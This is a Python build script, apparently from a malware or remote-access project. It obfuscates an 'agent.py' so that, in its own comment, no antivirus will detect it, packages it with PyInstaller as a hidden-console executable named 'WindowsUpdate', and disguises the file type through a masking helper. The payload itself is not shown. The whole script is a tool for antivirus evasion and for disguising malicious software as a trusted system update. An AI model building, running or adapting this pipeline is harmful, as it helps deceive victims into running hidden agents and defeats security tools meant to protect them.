import subprocess
import os
import shutil

from obfuscate_all import ObfuscationManager
from tools.mask_executable import mask_filetype


def delete_files_and_directories(delete):
    try:
        # Delete scan.spec file
        if os.path.exists("WindowsUpdate.spec"):
            os.remove("WindowsUpdate.spec")
            print("WindowsUpdate.spec deleted successfully.")

        if os.path.exists("WindowsUpdate.exe") and delete:
            os.remove("WindowsUpdate.exe")
            print("WindowsUpdate.exe deleted successfully.")

        # Delete dist directory
        if os.path.exists("dist"):
            shutil.rmtree("dist")
            print("dist directory deleted successfully.")

        # Delete build directory
        if os.path.exists("build"):
            shutil.rmtree("build")
            print("build directory deleted successfully.")

        print("Files and directories deleted successfully.")
    except Exception as e:
        print(f"Error deleting files and directories: {str(e)}")


def send_cmd_command(command):
    try:
        # Open a subprocess with pipes for stdout and stderr
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # Redirect stderr to stdout
            text=True,
            bufsize=1,  # Line-buffered
            universal_newlines=True  # Use universal newlines
        )

        # Read and print the output line by line in real-time
        for line in process.stdout:
            print(line.strip())

        # Wait for the subprocess to finish
        process.wait()

        # Check the return code
        if process.returncode == 0:
            print("Command executed successfully.")
        else:
            print(f"Command failed with return code {process.returncode}")

    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {str(e)}")


delete_files_and_directories(True)
# This ensures no antivirus will detect the interiors of the exe
ObfuscationManager().perform_obfuscation()
send_cmd_command("pyinstaller --noconsole --icon=icon2.ico --onefile --paths venv\Lib\site-packages --distpath=./ --name=WindowsUpdate ./obfuscated/agent.py")
delete_files_and_directories(False)
# Process the mask of the filetype
if os.path.exists("WindowsUpdate.exe"):
    os.rename("WindowsUpdate.exe", mask_filetype("WindowsUpdate.exe"))